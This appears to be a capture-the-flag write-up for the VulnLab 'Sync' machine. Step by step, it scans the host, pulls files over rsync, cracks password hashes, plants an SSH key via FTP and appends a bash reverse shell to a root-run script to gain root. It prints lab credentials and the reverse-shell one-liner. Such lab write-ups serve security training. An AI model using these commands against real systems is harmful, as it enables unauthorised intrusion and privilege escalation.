# Sync

Hello Friends,

Remo is Back

In this write-up, Iâ€™ll walk through how I pwned theÂ **Sync** machine fromÂ **VulnLab**. From initial enumeration to gaining root access, Iâ€™ll explain the key steps, tools, and techniques used to complete the box.

![image.png](../images/sync-banner.png)

Letâ€™s start by scanning the machine.

```bash
sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p 21,22,80,873 --min-rate=1000 10.10.64.150
```

![image.png](../images/sync.png)

Now letâ€™s see the website running on port 80

![image.png](../images/sync%201.png)

As we see itâ€™s a simple login page

Now letâ€™s go to the rsync service and see if there is any shares

```bash
rsync 10.10.64.150::
```

![image.png](../images/sync%202.png)

and we have a httpd so letâ€™s download itâ€™s content

```bash
rsync 10.10.64.150::"httpd/www/dashboard.php" .
rsync 10.10.64.150::"httpd/www/index.php" . 
rsync 10.10.64.150::"httpd/www/logout.php" .
```

![image.png](../images/sync%203.png)

now letâ€™s download the site database

```bash
rsync 10.10.64.150::"httpd/db/site.db" .
```

![image.png](../images/sync%204.png)

now letâ€™s review the code!

![image.png](../images/sync%205.png)

> First we will notice that the code is vulnerable to sql injection but the most interesting thing is that the hash is calculated by concatenating the $secure ,$username and $password variables
> 

So letâ€™s go and extract the passwords from the database we got

```bash
 SELECT * FROM users;
```

![image.png](../images/sync%206.png)

> Now we have everything we need the username and the secure
username: admin
hash: 7658a2741c9df3a97c819584db6e6b3c
username: triss
hash: a0de4d7f81676c3ea9eabcadfd2536f6
secure: 6c4972f3717a5e881e282ad3105de01e
> 

now letâ€™s try to crack the password

```bash
cat crackme.txt
```

![image.png](../images/sync%207.png)

now letâ€™s use hashcat to crack it

```bash
hashcat -m 20 crackme.txt /usr/share/wordlists/rockyou.txt
```

![image.png](../images/sync%208.png)

and we got the password for the user triss so letâ€™s reuse it in the ftp

```bash
username: triss
password: gerald
```

![image.png](../images/sync%209.png)

now letâ€™s generate a SSH keys

```bash
ssh-keygen
```

![image.png](../images/sync%2010.png)

now copy the public key in your folder and name it authorized_keys

```bash
cp ~/.ssh/id_ed25519.pub authorized_keys
```

![image.png](../images/sync%2011.png)

now in the ftp letâ€™s make a .ssh directory

```bash
mkdir .ssh
```

![image.png](../images/sync%2012.png)

now navigate to it and upload the authorized_keys file

```bash
put authorized_keys
```

![image.png](../images/sync%2013.png)

Now letâ€™s try to SSH  to the machine

```bash
ssh triss@10.10.64.150
```

![image.png](../images/sync%2014.png)

and we logged in

Now letâ€™s navigate to the /backup directory

![image.png](../images/sync%2015.png)

and as we see alot of zip files is created so letâ€™s download one of them

```bash
unzip 1743232081.zip 
```

![image.png](../images/sync%2016.png)

notice that there is a backup for the passwd and shadow file so letâ€™s abuse it by making a cracking there hash

```bash
unshadow passwd shadow > crackme.txt
```

![image.png](../images/sync%2017.png)

Now letâ€™s go and crack it

```bash
john crackme.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image.png](../images/sync%2018.png)

> Notice that we got the passwords for all users
username: sa
password: sakura
username: jennifer
password: gerald
> 

Now letâ€™s switch to the sa user

```bash
su sa
```

![image.png](../images/sync%2019.png)

Now letâ€™s go and see if there is any hidden script running in the background

```bash
./pspy64
```

![image.png](../images/sync%2020.png)

> Notice that there is a script running as root
> 

letâ€™s go and see our permission on this file

```bash
ls -las /usr/local/bin/backup.sh
```

![image.png](../images/sync%2021.png)

Since we are the user sa we can edit the script and add a reverse shell

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.8.5.233/1337 0>&1'" >> /usr/local/bin/backup.sh
```

![image.png](../images/sync%2022.png)

as we see the reverse shell was added so letâ€™s open a listener on our machine

```bash
nc -lvnp 1337
```

![image.png](../images/sync%2023.png)

now letâ€™s wait for the reverse shell

![image.png](../images/sync%2024.png)

and we got root so letâ€™s go and see the root flag

```bash
cd /root;ls -las
```

![image.png](../images/sync%2025.png)

Amazing we got root flag ðŸ¥³

![image.png](../images/sync%2026.png)

Thatâ€™s it for theÂ **Sync** machine! This challenge was a great test of enumeration and exploitation skills. Hope you found the write-up useful.
